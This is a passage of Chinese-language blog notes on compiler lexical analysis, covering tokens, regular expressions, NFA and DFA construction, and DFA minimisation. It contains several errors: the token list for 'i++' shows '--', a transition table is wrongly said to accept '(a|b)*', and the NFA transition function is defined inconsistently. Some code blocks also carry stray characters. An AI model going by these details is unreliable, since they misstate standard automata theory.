等。</p><p>5.<strong>界限符：</strong>如逗号、分号、括号等。</p></blockquote><p><strong>一个程序语言的关键字、运算符、界限符都是固定的，即数量有限及意义明确；而对于标识符和常数通常是不确定的。</strong></p><p>词法分析器所输出的单词符号常常表示为二元式：（单词种别，单词符号的属性值）</p><p>单词种别一般将①标识符归为一种，②常数按类型分种（整数实数布尔），③关键字全体视为一种，或者一个一种，④运算符可采用一符一种，⑤界符一般也用一符一种。</p><p>如果一个种别只含一个单词符号，那么对于这个单词符号，种别编码可完全代表其自身。若一个种别有多个单词符号，那么，对于每个单词符号，除了给出种别编码外，还应给出有关的单词符号的属性信息。</p><p><strong>单词符号的属性</strong>是指单词符号的特性或特征。属性值是反应特性或特征的值。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(i&gt;=j)i++;<span class="comment">//以该语句为示例</span></span><br><span class="line"><span class="comment">//该句的单词符号序列如下:</span></span><br><span class="line">&lt;<span class="keyword">while</span>, -&gt;</span><br><span class="line">&lt;(, -&gt;</span><br><span class="line">&lt;id, point(i)&gt;<span class="comment">//存放指向i的指针</span></span><br><span class="line">&lt;&gt;=, -&gt;</span><br><span class="line">&lt;id, point(j)&gt;<span class="comment">//存放指向j的指针</span></span><br><span class="line">&lt;), -&gt;</span><br><span class="line">&lt;id, point(i)&gt;</span><br><span class="line">&lt;--, -&gt;</span><br><span class="line">&lt;;, -&gt;</span><br></pre></td></tr></table></figure><h3 id="3-2-词法分析器的设计"><a href="#3-2-词法分析器的设计" class="headerlink" title="3.2 词法分析器的设计"></a>3.2 词法分析器的设计</h3><h4 id="Ⅰ、输入、预处理"><a href="#Ⅰ、输入、预处理" class="headerlink" title="Ⅰ、输入、预处理"></a>Ⅰ、输入、预处理</h4><p>词法分析器工作的第一步是输入源程序文本。输入串一般是放在一个<strong>缓冲区</strong>中，这个缓冲区称<strong>输入缓冲区</strong>。词法分析的工作（单词符号的识别）可以直接在这个缓冲区中进行。但在许多情况下，把输入串<strong>预处理</strong>一下，对单词符号的识别工作将是比较方便的。</p><h5 id="预处理的主要工作"><a href="#预处理的主要工作" class="headerlink" title="预处理的主要工作"></a>预处理的主要工作</h5><ul><li>某些跳格符、回车符和换行符等编辑性字符，在别处的任何出现都没有意义，预处理时可以将其剔掉</li><li>注解部分——仅在于改善程序的易读性和易理解性。对于它们，预处理时可以将其剔掉</li><li>空白符（一个或相继数个）用作单词符号之间的间隔，即用作界符。在这种情况下，预处理时可把相继的若干个空白结合成一个。</li></ul><h4 id="Ⅱ、单词符号的识别：超前搜索"><a href="#Ⅱ、单词符号的识别：超前搜索" class="headerlink" title="Ⅱ、单词符号的识别：超前搜索"></a>Ⅱ、单词符号的识别：超前搜索</h4><p><img src="https://magic-king.net/images/loading.gif" data-original="Compiler/3.jpg" alt="词法分析器的结构"></p><p>上图为词法分析器结构，当词法分析器调用预处理子程序处理出一串输入字符放进扫描缓冲区之后，分析器就从此缓冲区种逐一识别单词符号。当缓冲区里的字符串被处理完之后，它又调用预处理程序装入新串。</p><blockquote><p>超前搜索的原因</p><ul><li>在程序中有一些单词的识别经常需要多读入一些字符才能知道哪些字符组成一个单词</li></ul></blockquote><h4 id="Ⅲ、状态转换图"><a href="#Ⅲ、状态转换图" class="headerlink" title="Ⅲ、状态转换图"></a>Ⅲ、状态转换图</h4><p>状态转换图是一张有限方向图，是设计词法分析器的有效工具。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line">40--字母--&gt;1</span><br><span class="line">41--字母或数字--&gt;1</span><br><span class="line">41--其他--&gt;2[*]</span><br></pre></td></tr></table></figure><p><img src="https://magic-king.net/images/loading.gif" data-original="Compiler\10.jpg" alt></p><p>一个状态转换图可用于识别（或接受）一定的字符串</p><h3 id="3-3-正规表达式与有限自动机"><a href="#3-3-正规表达式与有限自动机" class="headerlink" title="3.3 正规表达式与有限自动机"></a>3.3 正规表达式与有限自动机</h3><h4 id="1-正规式与正规集"><a href="#1-正规式与正规集" class="headerlink" title="1.正规式与正规集"></a>1.正规式与正规集</h4><p>正规式也称正则表达式（regular expression），是说明单词的模式（pattern）的一种重要的表示法，是定义正规集的数学工具</p><h5 id="正规式及其所表示的正规集的定义："><a href="#正规式及其所表示的正规集的定义：" class="headerlink" title="正规式及其所表示的正规集的定义："></a><strong>正规式及其所表示的正规集的定义：</strong></h5><p>设字母表为∑，辅助字母表∑‘ = { φ，ε， |，&bull;，*，（，）}，</p><p>① ε 和 φ 都是 ∑ 上的正规式，他们所表示的正规集分别为 { ε }和 { } ；</p><p>② 对任何 a ∈ ∑ ，a 是 ∑ 上的一个正规式，他所表示的正规集为 { a } ；</p><p>③ 假定 e<sub>1</sub> 和 e<sub>2</sub> 都是 ∑ 上的正规式他们所表示的正规集分别为 L(e<sub>1</sub>) 和 L(e<sub>2</sub>)，那么，( e<sub>1</sub> ) ，         e<sub>1</sub> | e<sub>2</sub>  ， e<sub>1</sub> &bull; e<sub>2</sub>   ， e<sub>1</sub><sup><em></em></sup> 也都是正规式，他们所表示的正规集分别为 L( e<sub>1</sub> )， L( e<sub>1</sub> ) &cup; L( e<sub>2</sub> )，    L( e<sub>1</sub> ) L( e<sub>2</sub> )  和  ( L( e<sub>1</sub> ) )<sup>\</sup> ；</p><p>④仅由有限次使用上述三步骤而定义的表达式才是 ∑ 上的正规式，仅有这些正规式所表示的集合才是 ∑ 上的正规集。</p><ul><li>注意，| 、 &bull; 、* 、均为正规式的运算符</li></ul><blockquote><p>| 表示或</p><p>&bull; 表示连接</p><p>* 表示闭包，即任意有限次的自重复连接</p><p>在不混淆的情况下，括号可以省去，但规定算符的优先顺序为 *， &bull; ，|。连接符 &bull; 一般可省略不写，三个算符均为左结合的。</p></blockquote><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">例:</span></span><br><span class="line"><span class="comment">a&#123;a&#125;</span></span><br><span class="line"><span class="comment">a|b</span> <span class="comment">&#123;a</span><span class="string">,</span><span class="comment">b&#125;</span></span><br><span class="line"><span class="comment">ab&#123;ab&#125;</span></span><br><span class="line"><span class="comment">(a|b)(a|b)</span>            <span class="comment">&#123;aa</span><span class="string">,</span><span class="comment">ab</span><span class="string">,</span><span class="comment">ba</span><span class="string">,</span><span class="comment">bb&#125;</span></span><br><span class="line"><span class="comment">a*</span>            <span class="comment">&#123;ε</span><span class="string">,</span><span class="comment">a</span><span class="string">,</span><span class="comment">a</span><span class="string">,</span><span class="comment">……</span><span class="string">,</span><span class="comment">任意个a的串&#125;</span></span><br><span class="line"><span class="comment">(a|b)*&#123;ε</span><span class="string">,</span><span class="comment">a</span><span class="string">,</span><span class="comment">b</span><span class="string">,</span><span class="comment">aa</span><span class="string">,</span><span class="comment">ab</span><span class="string">,</span><span class="comment">bb</span><span class="string">,</span><span class="comment">……</span><span class="string">,</span><span class="comment">所有由a和b组成的串&#125;</span></span><br></pre></td></tr></table></figure><ul><li>结论：程序设计语言的单词都能用正规式来定义</li></ul><p>正规式的等价性：若两个正规式 e<sub>1</sub> 和 e<sub>2</sub> 所表示的正规集相同，则说 e<sub>1</sub> 和 e<sub>2</sub> 等价，写作 e<sub>1</sub> = e<sub>2</sub> 。</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">例:</span><br><span class="line">e<span class="number">1</span> = <span class="comment">(a|b)</span> , e<span class="number">2</span> = <span class="comment">(b|a)</span> ,e<span class="number">1</span> == e<span class="number">2</span></span><br><span class="line">e<span class="number">1</span> = b<span class="comment">(ab)</span>* , e<span class="number">2</span> = <span class="comment">(ba)</span>*b , e<span class="number">1</span> == e<span class="number">2</span></span><br></pre></td></tr></table></figure><p>正规式服从的规律有：</p><ul><li>或服从交换律：U|V = V|U</li><li>或的可结合律：U|(V|W) = (U|V)|W</li><li>连接的可结合律：(UV)W = U(VW)</li><li>分配律：U(V|W) = UV | UW，(V|W)U = VU | WU</li><li>ε是连接的恒等律：εU = U，Uε = U</li><li>素零一律：U|U = U</li><li>或的抽取律： U* = ε|U|UU|…</li></ul><h4 id="2-确定有限自动机"><a href="#2-确定有限自动机" class="headerlink" title="2.确定有限自动机"></a>2.确定有限自动机</h4><p>确定有限自动机（有穷自动机）作为一种识别装置，能准确地识别正规集，即识别正规文法所定义的语言和正规式所表示的集合，引入有穷自动机这个理论，正是为词法分析程序的自动构造寻找特殊的方法和工具</p><p>有穷自动机分两类：确定的有限自动机（deterministic Finite Automata）和不确定的有限自动机（Nondeterministic Finite Automata）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line">4RE(RE)</span><br><span class="line">4RE --&gt; NFA(NFA)</span><br><span class="line">4NFA --&gt; DFA(DFA)</span><br><span class="line">4DFA --&gt; minDFA(minDFA)</span><br></pre></td></tr></table></figure><h5 id="DFA"><a href="#DFA" class="headerlink" title="DFA"></a>DFA</h5><p>DFA定义：一个确定的有穷自动机（DFA）M是一个五元组： M = （ S ，∑ ，δ  ，s<sub>0</sub> ，F ）</p><blockquote><p>其中：</p><ul><li>S 是一个有穷集，他的每个元素称为一个状态；</li><li>Σ 是一个有穷字母表，他的每个元素称为一个输入符号，所以也称 Σ 为输入符号表</li><li>δ 是转换函数，实在 S × Σ &rarr; S 上的单值部分映射，即，如果 δ（s，a）= s‘ ，                     (s ∈ S，s’ ∈ S ) 就意味着，当前状态为s，输入符为a时，将转换至下一个状态s’，s’称作s的一个后继状态</li><li>s<sub>0</sub> ∈ S 是唯一的一个初态</li><li>F &sub; S 是一个终态集（可空），终态也称可接受状态或结束状态</li></ul></blockquote><p>DFA可以用一个矩阵表示，该矩阵的行表示状态，列表示输入字符，即s行a列的矩阵元素表示  δ（s，a）的值。这个矩阵称为<strong>状态转换矩阵</strong>。</p><p>一个DFA也可以表示为一张确定的状态转换图</p><blockquote><p>假定DFA M含有 m个状态和 n个输入字符，那么，这个图含有m个状态结点，每个结点顶多有n条箭弧射出和别的结点相连接，每条箭弧用Σ中的一个不同输入字符作标记，整张图含有唯一的一个初态结点和若干个（可以是0个）终态结点。</p><p>一般来说，初态节点旁边标以 &rArr; ；终态节点用双圈表示。</p></blockquote><p>例如：</p><table><thead><tr><th>状态</th><th>a</th><th>b</th></tr></thead><tbody><tr><td>+S</td><td>U</td><td>V</td></tr><tr><td>U</td><td>Q</td><td>V</td></tr><tr><td>V</td><td>U</td><td>Q</td></tr><tr><td>-Q</td><td>Q</td><td>Q</td></tr></tbody></table><p>如上表，可表示<code>(a|b)*</code>，也可画成如下图</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Compiler\4.jpg" alt></p><p><strong>DFA的确定性</strong></p><p>1.映射δ ： S × Σ &rarr; S 是一个单值函数。也就是说，对任何状态s∈S和输入符号 a ∈ Σ ，f（s，a）唯一地确定了下一状态。从转换图的角度来看，假定字母表 Σ 含有n个输入字符，那么，任何一个状态结最多只有n条弧射出，而且每条弧以一个不同的输入字符标记。 </p><h5 id="NFA"><a href="#NFA" class="headerlink" title="NFA"></a>NFA</h5><p>NFA的定义：一个非确定的有穷自动机（NFA）M是一个五元组：M = （ S ，∑ ，δ  ，S<sub>0</sub> ，F ）</p><blockquote><p>其中：</p><ul><li>S 是一个有穷集，他的每个元素称为一个状态；</li><li>Σ 是一个有穷字母表，他的每个元素称为一个输入符号，所以也称 Σ 为输入符号表</li><li>δ 是转换函数，实在 S × Σ<sup>*</sup>  &rarr; S 上的单值部分映射，即， δ： S × Σ<sup>*</sup> &rarr; 2<sup>S</sup> 表明在某状态下对于某输入符号可能有多个后继状态</li><li>S<sub>0</sub>  &sub; S 是一个非空初态集</li><li>F &sub; S 是一个终态集（可空），终态也称可接受状态或结束状态</li></ul></blockquote><p><img src="https://magic-king.net/images/loading.gif" data-original="Compiler\5.jpg" alt></p><p>如图，为一个NFA</p><p>∑<sup>*</sup> 上的符号串 t 被 NFA M 接受也可以这样理解：</p><p>对于Σ*中的任何一个串t，若存在一条从某一初态结到某一终态结的道路，且这条道路上所有弧的标记字依序连接成的串(不理采那些标记为ε的弧)等于t，则称t可为NFA M所识别(读出或接受)。若M的某些结既是初态结又是终态结，或者存在一条从某个初态结到某个终态结的道路,其上所有弧的标记均为ε，那么空字可为M所接受。</p><p>NFA M所能接受的符号串的全体记为L(M) </p><p><strong>结论：</strong> Σ 上一个符号串集 V &sub; Σ<sup>*</sup> 是正规的，当且仅当存在一个 Σ 上的不确定的有穷自动机M，是的 V = L(M)</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">NFA构造方法:</span><br><span class="line"></span><br><span class="line">Σ上的字母a是正规式,构造等价的NFA为</span><br><span class="line">4一个初态,一个终态,中间标记ε弧</span><br><span class="line"></span><br><span class="line">正规式<span class="keyword">A</span>和B连接是正规式,构造等价NFA为</span><br><span class="line">4初态是<span class="keyword">A</span>的初态,终态是B的终态,从<span class="keyword">A</span>的终态到B的初态标记为ε弧</span><br><span class="line"></span><br><span class="line"><span class="keyword">A</span>|B是正规式,构造等价的NFA为</span><br><span class="line">4构造新的初态和终态,从初态引ε到<span class="keyword">A</span>和B的初态,从到<span class="keyword">A</span>到B的终态引ε到终态</span><br><span class="line"></span><br><span class="line"><span class="keyword">A</span>*是正规式,构造的等价NFA为</span><br><span class="line">4构造新的初态和终态，从初态引ε到终态和<span class="keyword">A</span>的初态,从<span class="keyword">A</span>的终态引ε到终态和<span class="keyword">A</span>的初态</span><br></pre></td></tr></table></figure><h5 id="NFA和DFA的等价性"><a href="#NFA和DFA的等价性" class="headerlink" title="NFA和DFA的等价性"></a>NFA和DFA的等价性</h5><ul><li>DFA是NFA的特例</li></ul><p>对于每个NFA M，存在一个DFA M’ ，使得L( M ) =L( M’ )。对每个NFA M存在着与之等价的DFA M’。即：对于任何两个有穷自动机M和M’，如果L( M )=L( M’ )，则称M与M’是等价的。</p><p>有一种算法，将NFA转换成接受同样语言的DFA。这种算法称为<strong>子集法</strong>。</p><p>与某一NFA等价的DFA不唯一</p><p>从NFA的矩阵表示中，表项通常是一状态的集合，而在DFA的矩阵表示中，表项是一个状态，NFA到相应的DFA的构造的基本思路是： </p><ul><li><strong>DFA的每一个状态对应NFA的一组状态。</strong></li></ul><p>DFA使用他的状态去记录在NFA读入的一个输入符号后可能达到的所有状态。</p><h5 id="NFA确定化算法（-NFA-rarr-DFA-的转换）"><a href="#NFA确定化算法（-NFA-rarr-DFA-的转换）" class="headerlink" title="NFA确定化算法（ NFA &rarr; DFA  的转换）"></a>NFA确定化算法（ NFA &rarr; DFA  的转换）</h5><p>假设NFA N = （ K， Σ ， f ，K<sub>0</sub>，K<sub>t</sub> ）按如下办法构造一个DFA M=（ S， å，δ，S<sub>0</sub> ，S<sub>t</sub>），使得L(M) = L(N) ：</p><ol><li><p>M的状态集 S 由 <strong>K 的一些子集</strong>组成。用 [ S<sub>1</sub> ，S<sub>2</sub> ，…，S<sub>j</sub> ] 表示 S 的元素，其中 S<sub>1</sub> ，S<sub>2</sub> ，…，S<sub>j</sub> 是K的状态。并约定， 状态 S<sub>1</sub> ，S<sub>2</sub> ，…，S<sub>j</sub>  是按某种规则排列的，即对于子集{S<sub>1</sub> ，S<sub>2</sub> } = {S<sub>2</sub> ，S<sub>1</sub> }来说，S的状态就是 [S<sub>1</sub> ，S<sub>2 </sub>]</p></li><li><p>M和N的输入字母表是相同的，即 Σ</p></li><li>转换函数是这样定义的： δ（ [ S<sub>1</sub> ，S<sub>2</sub> ，…，S<sub>j</sub> ] ，a ） = [ R<sub>1</sub> ，R<sub>2</sub> ，…，R<sub>t</sub> ]  ，其中                      { R<sub>1</sub> ，R<sub>2</sub> ，…，R<sub>t</sub>  } = ε-closure（ move（{S<sub>1</sub> ，S<sub>2</sub> ，…，S<sub>j</sub> } ， a） ）</li><li>S<sub>0</sub>  = ε-closure（ K<sub>0</sub> ）为 M 的开始状态</li><li>S<sub>t</sub> = {S<sub>i</sub> ，S<sub>k</sub> ，…，S<sub>e</sub> }， 其中  [ S<sub>i</sub> ，S<sub>k</sub> ，…，S<sub>e</sub> ]  ∈ S 且 {S<sub>i</sub> ，S<sub>k</sub> ，…，S<sub>e</sub> } &cap; K<sub>t</sub>  &ne;  &phi; </li></ol><blockquote><ul><li><p><strong>状态集合 I 的 ε-闭包</strong>，表示为ε-closure( I )，定义为一状态集，是状态集I中的任何状态S经任意条ε弧而能到达的状态的集合。</p><p>状态集合I的任何状态S都属于ε-closure(I)</p></li><li><p><strong>状态集合 I 的 &alpha; 弧转换</strong>，定义状态集合 J 表示为 J = move(I,a) ，其中J是所有那些可从I中的某一状态经过一条a弧而到达的状态的全体。</p><p>I<sub>a</sub>  =  ε-closure( J )  =  ε-closure( move( I , a )  )</p></li></ul></blockquote><p><img src="https://magic-king.net/images/loading.gif" data-original="Compiler\5.jpg" alt></p><p>如之前NFA的例子：</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">I=&#123;<span class="number">1</span>&#125;,  ε-closure(I) = &#123;<span class="number">1</span>,<span class="number">2</span>&#125;；</span><br><span class="line">I=&#123;<span class="number">5</span>&#125;,  ε-closure(I) = &#123;<span class="number">5</span>,<span class="number">6</span>,<span class="number">2</span>&#125;；</span><br><span class="line">move( &#123;<span class="number">1</span>,<span class="number">2</span>&#125; , a ) = &#123;<span class="number">5</span>,<span class="number">3</span>,<span class="number">4</span>&#125;</span><br><span class="line">ε-closure(&#123;<span class="number">5</span>,<span class="number">3</span>,<span class="number">4</span>&#125;) = &#123;<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>&#125;；</span><br></pre></td></tr></table></figure><p>构造NFA N的<strong>状态K的子集</strong>的算法：</p><p>​        假定所构造的子集族为C，即 C = （T<sub>1</sub> ，T<sub>2</sub> ，… ， T<sub>I</sub> ），其中 T<sub>1</sub> ，T<sub>2</sub> ，… ， T<sub>I</sub>  为状态K的子集。</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>开始，令ε-closure<span class="comment">(K0)</span>为C中的唯一成员，并且他是未被标记的</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span><span class="keyword">while</span><span class="comment">( C中尚未被标记的子集T )</span><span class="keyword">do</span>&#123;</span><br><span class="line">4标记T;</span><br><span class="line">4for 每个输入字母a <span class="keyword">do</span>&#123;</span><br><span class="line">44U := ε-closure<span class="comment">( move(T, a)</span> );</span><br><span class="line">44<span class="keyword">if</span> U 不在 C 中:</span><br><span class="line">444将U作为未标记的子集Ti加在C中;</span><br><span class="line">4&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>例：</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Compiler\6.jpg" alt></p><p>如上图为实例NFA，构造其状态转换表</p><table><thead><tr><th style="text-align:center">I</th><th style="text-align:center">I<sub>a</sub></th><th style="text-align:center">I<sub>b</sub></th></tr></thead><tbody><tr><td style="text-align:center">{i，1，2}</td><td style="text-align:center">{1，2，3}</td><td style="text-align:center">{1，2，4}</td></tr><tr><td style="text-align:center">{1，2，3}</td><td style="text-align:center">{1，2，3，5，6，f}</td><td style="text-align:center">{1，2，4}</td></tr><tr><td style="text-align:center">{1，2，4}</td><td style="text-align:center">{1，2，3}</td><td style="text-align:center">{1，2，4，5，6，f}</td></tr><tr><td style="text-align:center">{1，2，3，5，6，f}</td><td style="text-align:center">{1，2，3，5，6，f}</td><td style="text-align:center">{1，2，4，6，f}</td></tr><tr><td style="text-align:center">{1，2，4，5，6，f}</td><td style="text-align:center">{1，2，3，6，f}</td><td style="text-align:center">{1，2，4，5，6，f}</td></tr><tr><td style="text-align:center">{1，2，4，6，f}</td><td style="text-align:center">{1，2，3，6，f}</td><td style="text-align:center">{1，2，4，5，6，f}</td></tr><tr><td style="text-align:center">{1，2，3，6，f}</td><td style="text-align:center">{1，2，3，5，6，f}</td><td style="text-align:center">{1，2，4，6，f}</td></tr></tbody></table><p>将其每个状态确定化，即得到如下等价DFA</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Compiler\7.jpg" alt="DFA">N</p><p>状态转换表如下，将一组状态替换成对应符号。</p><table><thead><tr><th style="text-align:center">I</th><th style="text-align:center">Ia</th><th style="text-align:center">Ib</th></tr></thead><tbody><tr><td style="text-align:center">S</td><td style="text-align:center">A</td><td style="text-align:center">B</td></tr><tr><td style="text-align:center">A</td><td style="text-align:center">C</td><td style="text-align:center">B</td></tr><tr><td style="text-align:center">B</td><td style="text-align:center">A</td><td style="text-align:center">D</td></tr><tr><td style="text-align:center">C</td><td style="text-align:center">C</td><td style="text-align:center">E</td></tr><tr><td style="text-align:center">D</td><td style="text-align:center">F</td><td style="text-align:center">D</td></tr><tr><td style="text-align:center">E</td><td style="text-align:center">F</td><td style="text-align:center">D</td></tr><tr><td style="text-align:center">F</td><td style="text-align:center">C</td><td style="text-align:center">E</td></tr></tbody></table><h5 id="minDFA"><a href="#minDFA" class="headerlink" title="minDFA"></a>minDFA</h5><p>说一个有穷自动机是化简了的，即是说，<strong>它没有多余状态并且它的状态中没有两个是互相等价的</strong>。一个有穷自动机可以通过<strong>消除多余状态</strong>和<strong>合并等价状态</strong>而转换成一个最小的与之等价的有穷自动机。即用一个状态代替所有与其等价的状态。</p><p>所谓有穷自动机的多余状态，是指这样的状态：从自动机的开始状态出发，任何输入串也不能到达的那个状态；或者从这个状态没有通路到达终态。</p><ul><li>DFA的最小化就是寻求最小状态DFA</li></ul><p><strong>最小状态DFA的含义：</strong>①没有多余状态（死状态）；②没有两个状态时互相等价的（不可区别）。</p><blockquote><p>两个状态s和t可区别：不满足</p><ul><li>兼容性：同时终态或同时非终态</li><li>传播性：从s出发读入某个a（a ∈ Σ ）和从t出发读入某个a到达的状态等价</li></ul><p>两个状态s和t等价：</p><ul><li>如果由 s 出发能导出的所有串的集合与 t 出发能导出的所有串的集合相等，我们称状态 s 与状态 t 是等价的。</li></ul></blockquote><p><img src="https://magic-king.net/images/loading.gif" data-original="Compiler\7.jpg" alt></p><p>如上面示例的DFA，C和F是等价的。</p><p>C和F同是终态，读入a到达C和F，C和F同是终态，C和F读入a都到达C，读入b都到达E。</p><p>同理D和E也是等价的</p><h5 id="DFA最小化的算法：分割法（逐步分组试探法）"><a href="#DFA最小化的算法：分割法（逐步分组试探法）" class="headerlink" title="DFA最小化的算法：分割法（逐步分组试探法）"></a>DFA最小化的算法：分割法（逐步分组试探法）</h5><p>核心思想：把一个DFA的状态分成一些不相交的子集，使得任何不同的两子集的状态都是可区别的，而同一子集中的任何两个状态都是等价的。算法假定每个状态射出的弧都是完全的,否则，引入一个新状态，叫<strong>死状态</strong>，该状态是非终态，将不完全的输入弧都射向该状态，对所有输入，该状态射出的弧还回到自己。</p><figure class="highlight tp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">设有DFA M = ( s , ∑ , f, s<span class="number">0</span> , sz ),最小状态DFA M<span class="string">'</span></span><br><span class="line"><span class="string">1.  因为不难证明，如果si是非终结状态，而sj是终结状态，那么si和sj一定互不等价(根据等价的定义可知，它们导出的符号串集不同)。所以开始可以把K中的终态和非终态分开，分成两个子集，形成一个基本划分：</span></span><br><span class="line"><span class="string">       P2＝&#123;I1,I2&#125;    (I1∪I2＝K, I1∩I2＝Φ)</span></span><br><span class="line"><span class="string">2. 若此两个子集还可以进行划分，则作进一步的划分，形成Pm ,假定到某个时候Pm已经含有m个子集，记为：Pm＝&#123;I1,I2,…,Im&#125;，设s'</span>和s<span class="string">"是Ii中的任意两个状态，如果对某个a∈Σ,存在Ij ，使  f(s',a), f(s"</span>,a)∈Ij ，则称s<span class="string">'和s"关于a是拟等价的。</span></span><br><span class="line"><span class="string">    如果存在s'</span>，s<span class="string">"∈Ii，使得对字母表Σ中的某个符号a, s'和s"</span>不为拟等价，则我们说Ii是可分的。</span><br><span class="line">    换句话说，令Ii ＝&#123;s<span class="number">1</span>，s<span class="number">2</span>, …，sn&#125; ，如果对某个a∈Σ，使得Ia i＝&#123; f(s<span class="number">1</span>,a)，f(s<span class="number">2</span>,a)，…，f(sn,a)&#125;不全落在现行Pm的某一个子集Ij之中；即Ia i这个集合中的元素分别属于I<span class="number">1</span>，I<span class="number">2</span>，…，Im中的几个不同集合，则Ii可分为几个集合（至少可一分为二）。 </span><br><span class="line"><span class="number">3</span>．转<span class="number">2</span>,上述过程务必一再重复，直到<span class="keyword">P</span>中的每个集合均是不可再分时为止。</span><br><span class="line">此时，<span class="keyword">P</span>所含的集合数不再增加，即<span class="keyword">P</span>中的每个集合中的状态互相等价，而不同集合间的状态互不等价。</span><br><span class="line"><span class="number">4</span>.为<span class="keyword">P</span>中的每一组选一代表，这些代表构成M<span class="string">'的状态。把原来导入非代表状态的弧均导入其代表即可，即若s'</span>是一代表且f(s<span class="string">',a)=t,令r是t组的代表，则M'</span>中有一转换f<span class="string">'(s'</span>,a)=r，M<span class="string">'的开始状态是含有S0的那组的代表，M'</span>的终态是含有F的那组的代表。</span><br><span class="line"><span class="number">5</span>.去掉M<span class="string">'中的死状态。</span></span><br></pre></td></tr></table></figure><h5 id="正规式与有穷自动机的等价性（Re-hArr-NFA）"><a href="#正规式与有穷自动机的等价性（Re-hArr-NFA）" class="headerlink" title="正规式与有穷自动机的等价性（Re &hArr; NFA）"></a>正规式与有穷自动机的等价性（Re &hArr; NFA）</h5><p>定理：①对于 Σ 上的NFA M，可以构造一个 Σ 上的正规式R，是的L(R) = L(M)。②对于 Σ 上的任一个正规式R，可以构造一个 Σ 上 的NFA M，是的L(M) = L(R)。</p><p>Re &rArr; NFA：</p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">转换方法：我们把状态转换图的概念拓广，令每条弧可用一个正规式标记。</span></span><br><span class="line"><span class="comment">1</span><span class="string">.</span> <span class="comment">在M的状态图上加进两个结点x、y。从x结点用ε弧</span> <span class="comment">连接到M的所有初态结点，从M的所有终态结点ε弧</span> <span class="comment">连接到y结点。形成一个与M等价的M'，</span> <span class="comment">M'只有一个初态和一个终态。</span></span><br><span class="line"><span class="comment">2</span><span class="string">.</span> <span class="comment">逐步消去M'中的所有结点，直至只剩下x结点和y结点。在消结过程中，逐步用正规式来标记弧，其消结规则如下：</span></span><br><span class="line"><span class="comment">A</span><span class="literal">-</span><span class="literal">-</span><span class="comment">R1</span><span class="literal">-</span><span class="literal">-</span>&gt;<span class="comment">2</span><span class="literal">-</span><span class="literal">-</span><span class="comment">R2</span><span class="literal">-</span><span class="literal">-</span>&gt;<span class="comment">3==</span>&gt;<span class="comment">1</span><span class="literal">-</span><span class="literal">-</span><span class="comment">R1R2</span><span class="literal">-</span><span class="literal">-</span>&gt;<span class="comment">2</span></span><br><span class="line"><span class="comment">1</span><span class="literal">-</span><span class="literal">-</span><span class="comment">R1</span><span class="literal">-</span><span class="literal">-</span>&gt;<span class="comment">2</span><span class="string">,</span><span class="comment">1</span><span class="literal">-</span><span class="literal">-</span><span class="comment">R2</span><span class="literal">-</span><span class="literal">-</span>&gt;<span class="comment">2==</span>&gt;<span class="comment">1</span><span class="literal">-</span><span class="literal">-</span><span class="comment">R1|R2</span><span class="literal">-</span><span class="literal">-</span>&gt;<span class="comment">2</span></span><br><span class="line"><span class="comment">1</span><span class="literal">-</span><span class="literal">-</span><span class="comment">R1</span><span class="literal">-</span><span class="literal">-</span>&gt;<span class="comment">2</span><span class="literal">-</span><span class="literal">-</span><span class="comment">R2</span><span class="literal">-</span><span class="literal">-</span>&gt;<span class="comment">2</span><span class="literal">-</span><span class="literal">-</span><span class="comment">R3</span><span class="literal">-</span><span class="literal">-</span>&gt;<span class="comment">3==</span>&gt;<span class="comment">1</span><span class="literal">-</span><span class="literal">-</span><span class="comment">R1R2*R3</span><span class="literal">-</span><span class="literal">-</span>&gt;<span 